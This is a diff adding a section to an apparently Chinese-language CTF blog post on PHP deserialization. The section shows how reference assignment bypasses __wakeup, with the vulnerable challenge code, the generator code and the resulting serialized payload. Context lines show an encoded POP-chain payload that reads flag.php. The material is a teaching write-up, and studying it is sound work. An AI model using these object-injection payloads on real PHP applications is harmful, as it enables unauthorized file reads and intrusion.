@@ -510,6 +510,64 @@ echo urlencode(serialize($b));
 <pre><code class="php">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A13%3A%22%00Modifier%00var%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7D
 </code></pre>
 <h1 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h1><p><code>__construct()</code> <code>__sleep()</code> 可能会影响pop链的构造，如果影响了得删了<br><code>__wakeup</code> 可能是不需要的，需要绕过</p>
+<h1 id="php引用赋值"><a href="#php引用赋值" class="headerlink" title="php引用赋值&amp;"></a>php引用赋值&amp;</h1><p><a href="https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">参考大佬文章补充的</a></p>
+<p>php中可以使两个变量指向同一个内存地址</p>
+<pre><code class="php">
+&lt;?php
+function test (&amp;$a)&#123;
+    $x=&amp;$a;
+    $x=&#39;123&#39;;
+&#125;
+$a=&#39;11&#39;;
+test($a);
+echo $a;
+</code></pre>
+<p>输出:</p>
+<pre><code>123
+</code></pre>
+<pre><code class="php">
+&lt;?php
+
+class KeyPort&#123;
+    public $key;
+
+    public function __destruct()
+    &#123;
+        $this-&gt;key=False;
+        if(!isset($this-&gt;wakeup)||!$this-&gt;wakeup)&#123;
+            echo &quot;You get it!&quot;;
+        &#125;
+    &#125;
+
+    public function __wakeup()&#123;
+        $this-&gt;wakeup=True;
+    &#125;
+
+&#125;
+
+if(isset($_POST[&#39;pop&#39;]))&#123;
+
+    @unserialize($_POST[&#39;pop&#39;]);
+
+&#125;
+</code></pre>
+<p>这题的绕过可以通过的引用赋值的方法，让key的值改变的时候也改变wakeup的值</p>
+<pre><code class="php">&lt;?php
+
+class KeyPort&#123;
+    public $key;
+
+    public function __destruct()
+    &#123;
+    &#125;
+
+&#125;
+
+$keyport = new KeyPort();
+$keyport-&gt;key=&amp;$keyport-&gt;wakeup;
+echo serialize($keyport); 
+#O:7:&quot;KeyPort&quot;:2:&#123;s:3:&quot;key&quot;;N;s:6:&quot;wakeup&quot;;R:2;&#125;
+</code></pre>
 
         </div>
         <!-- .entry-content -->
